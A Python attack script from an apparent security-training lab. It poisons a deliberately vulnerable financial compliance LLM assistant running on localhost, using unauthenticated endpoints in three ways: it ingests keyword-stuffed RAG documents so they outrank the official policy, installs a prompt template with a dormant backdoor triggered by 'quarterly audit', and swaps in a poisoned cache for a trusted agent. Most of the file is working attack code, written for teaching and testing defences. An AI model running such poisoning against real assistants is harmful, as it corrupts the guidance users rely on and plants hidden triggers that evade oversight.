#!/usr/bin/env python3
"""Attack skill — poison the financial compliance assistant on three surfaces.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

* ``rag`` (Scenario #1) — ingests ``--count`` documents built from
  ``assets/poison_template.txt`` through the unauthenticated ``POST /ingest``.
  They repeat the domain's keywords, so they outrank the official policy.
* ``prompt`` (Scenario #6) — installs ``assets/prompt_template.json`` through
  ``POST /config/template``: a template with a dormant block keyed on the
  phrase "quarterly audit".
* ``agent`` (distributed poisoning) — refreshes Bob the Agent's cache with
  ``assets/bob_agent_poisoned_response.json`` through ``POST /agent/cache``.
  The assistant trusts Bob because he is authenticated.

Exit code: 0 when the attack ran, 1 when the target is unreachable.

Examples:
    python scripts/run_poisoning.py
    python scripts/run_poisoning.py --scenario rag --count 3
    python scripts/run_poisoning.py --scenario prompt
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("LLM05_TARGET", "http://127.0.0.1:5205")
PROMPT_TEMPLATE = os.path.join(SKILL_DIR, "assets", "prompt_template.json")
AGENT_CACHE = os.path.join(SKILL_DIR, "assets", "bob_agent_poisoned_response.json")

sys.path.insert(0, SKILL_DIR)
from vulnerable_app import poison_document  # noqa: E402


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "llm05"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the LLM05 target. Start it: python vulnerable_app.py")
    return ok


def poison_rag(base: str, count: int) -> None:
    print(f"[*] Scenario #1: ingesting {count} semantically optimized documents "
          "(unauthenticated POST /ingest)")
    for index in range(count):
        name, content = poison_document(index)
        result = _post(f"{base}/ingest", {"filename": name, "content": content})
        print(f"    [+] Injected {result['stored_as']}")


def poison_prompt(base: str) -> None:
    with open(PROMPT_TEMPLATE, "r", encoding="utf-8") as fh:
        artifact = json.load(fh)
    print("[*] Scenario #6: replacing the prompt template (unauthenticated POST /config/template)")
    result = _post(f"{base}/config/template", artifact)
    print(f"    [+] Active template is now '{result['active_template']}'. "
          f"Trigger phrase: {artifact.get('trigger_keyword')!r} (dormant until then).")


def poison_agent(base: str) -> None:
    with open(AGENT_CACHE, "r", encoding="utf-8") as fh:
        cache = json.load(fh)
    print("[*] Distributed poisoning: refreshing Bob the Agent's cache "
          "(unauthenticated POST /agent/cache)")
    _post(f"{base}/agent/cache", cache)
    print("    [+] Bob's cached guidance now comes from Charles's upstream source; "
          "provenance unverified, no digest.")


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--scenario", choices=["rag", "prompt", "agent", "all"], default="all")
    parser.add_argument("--count", type=int, default=3,
                        help="RAG documents to inject (default 3; 3-10 recommended)")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    if args.scenario in ("rag", "all"):
        poison_rag(args.target, max(1, min(args.count, 10)))
    if args.scenario in ("prompt", "all"):
        poison_prompt(args.target)
    if args.scenario in ("agent", "all"):
        poison_agent(args.target)
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
